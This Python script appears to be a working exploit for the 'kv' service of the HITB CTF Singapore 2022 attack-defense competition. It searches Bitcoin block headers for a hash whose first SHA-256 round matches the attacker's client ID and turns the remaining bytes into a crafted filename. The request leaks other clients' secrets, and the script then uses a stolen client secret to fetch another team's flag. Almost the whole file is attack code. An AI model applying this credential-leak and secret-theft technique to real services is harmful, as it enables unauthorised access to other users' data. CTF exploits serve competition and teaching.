#!/usr/bin/env python3

import argparse
import csv
import datetime
import gzip
import hashlib
import logging
import os
import pytz
import requests
import sys
import urllib.parse

from binascii import unhexlify, hexlify
from pprint import pprint


#httplib.HTTPConnection.debuglevel = 1
logging.basicConfig()
logging.getLogger().setLevel(logging.DEBUG)
req_log = logging.getLogger('requests.packages.urllib3')
req_log.setLevel(logging.DEBUG)
req_log.propagate = True

BLOCKS_DIR = "blocks/"

def swap_endianness(data: str) -> str:
    assert len(data) % 2 == 0, f"data should have even length, but given: {data}"
    return "".join(data[idx:idx+2] for idx in range(len(data) - 2, -1, -2))


def calculate_block_hash(previous_block_hash: str, block: dict) -> str:
    version = int(block["version"])
    merkle_root = block["merkle_root"]
    nonce = int(block["nonce"])
    bits = int(block["bits"])
    time = datetime.datetime.strptime(block["time"], "%Y-%m-%d %H:%M:%S")
    timestamp = int(time.replace(tzinfo=pytz.UTC).timestamp())

    header_parts = [
        "%08x" % version,
        previous_block_hash,
        merkle_root,
        "%08x" % timestamp,
        "%08x" % bits,
        "%08x" % nonce
    ]
    header_hex = "".join(map(swap_endianness, header_parts))
    header_bin = unhexlify(header_hex)
    calculated_hash_a = hashlib.sha256(header_bin).digest()
    calculated_hash_b = hashlib.sha256(calculated_hash_a).digest()

    # ВСТРАИВАТЬСЯ СЮДА: hashlib.sha256(header_bin).digest() — это такие данные, что хеш от них заканчивается на 00000000000000
    # print(hashlib.sha256(hashlib.sha256(header_bin).digest()).hexdigest())

    return hexlify(calculated_hash_a).decode(), hexlify(calculated_hash_b).decode(), hexlify(calculated_hash_b[::-1]).decode()


def find_block(prefix):
    previous_block_hash = None

    for filename in os.listdir(BLOCKS_DIR):
        filepath = os.path.join(BLOCKS_DIR, filename)
        # print(filepath)
        with gzip.open(filepath, 'rt') as file:
            tsv_file = csv.DictReader(file, delimiter="\t")
            for block in tsv_file:
                block_hash = block["hash"]

                try:
                    if previous_block_hash is None:
                        continue

                    if not block_hash.startswith('0' * 16):
                        continue

                    calculated_block_hash_a, calculated_block_hash_b, calculated_block_hash_b_reversed = calculate_block_hash(previous_block_hash, block)
                    # print(calculated_block_hash_a)
                    if calculated_block_hash_a.startswith(prefix):
                        if calculated_block_hash_b_reversed != block_hash:
                            continue
                        # assert calculated_block_hash_b == block_hash
                        return filepath, calculated_block_hash_a, calculated_block_hash_b, block_hash

                finally:
                    previous_block_hash = block_hash

def register(url_prefix):
    url = url_prefix + "/register"
    return requests.post(url).json()

def get_filename(url_prefix, creds, filename):
    url = url_prefix + "/kv/{}".format(filename)
    headers = {
        'X-Client-ID': creds['client_id'],
        'X-Client-Secret': creds['client_secret']
    }
    reply = requests.get(url, headers=headers)
    return reply.json()

def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('--url_prefix', metavar='URL', required=True,
                        help='service url prefix; e.g. https://kv.teamN.ctf.hitb.org')
    parser.add_argument('--filename',
                        help='Flag filename to get; you should get it from checksystem`s public flag ids API (see https://2022.ctf.hitb.org/hitb-ctf-singapore-2022/api)')
    parser.add_argument('--client_id',
                         help='Flag`s client ID; you should get it from checksystem`s public flag ids API (see https://2022.ctf.hitb.org/hitb-ctf-singapore-2022/api)')

    args = parser.parse_args()
    url_prefix = args.url_prefix

    if not args.filename or not args.client_id:
        print("WARNING! --filename or --client_id args missing! Will get only private secrets (which will help you to get flags), not flags itselfs. See --help for details")

    creds = register(url_prefix)
    client_id = int(creds["client_id"])
    hash_prefix = f"{client_id:x}"
    hash_prefix = hash_prefix.zfill(4)
    print(f"CLIENT_ID:{client_id} HASH_PREFIX:{hash_prefix}")

    block = find_block(hash_prefix)
    filename_hex = block[1][4:]
    filename = unhexlify(filename_hex)
    filename_url = urllib.parse.quote(filename)
    print("PREFIX:{} FILENAME_HEX:{} FILENAME_URL:{} BLOCK:{}".format(hash_prefix, filename_hex, filename_url, block))
    print("=== PREFIX FOUND REQUESTING SECRETS ===")

    secrets = get_filename(url_prefix, creds, filename_url)
    print("=====SECRETS!====")
    pprint(secrets)

    if args.filename and args.client_id:
        print("=====FLAG!====")
        if 'headers' not in secrets:
            raise Exception("No 'headers' key in secrets! Something goes wrong :(")

        if args.client_id not in secrets['headers']:
            raise Exception("No such client_id in secrets! Something goes wrong :(")

        client_secret = secrets['headers'][args.client_id]
        creds = {
            'client_id': args.client_id,
            'client_secret': client_secret,
        }
        flag = get_filename(url_prefix, creds, args.filename)
        print(flag)

    print("All DONE!")

if __name__ == "__main__":
    main()
